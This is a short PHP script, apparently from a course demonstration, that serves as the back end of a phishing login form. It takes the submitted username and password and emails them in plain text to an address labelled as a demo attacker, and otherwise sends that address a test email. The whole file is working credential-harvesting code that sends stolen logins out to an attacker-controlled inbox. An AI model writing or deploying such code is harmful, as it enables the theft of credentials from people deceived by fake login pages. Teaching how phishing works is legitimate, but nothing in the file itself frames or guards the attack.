<?php

echo "action page navigated";
if ( isset( $_POST['submit'])) {
    echo "Form submitted";
    $username = $_POST['name'];
    $password = $_POST['pass'];

    $msg = "Username: $username \n Password: $password";
    mail("comp590.demo.attacker@gmail.com", "User details", $msg);

} else {
    mail("comp590.demo.attacker@gmail.com", "Test email", "Testing.");
}
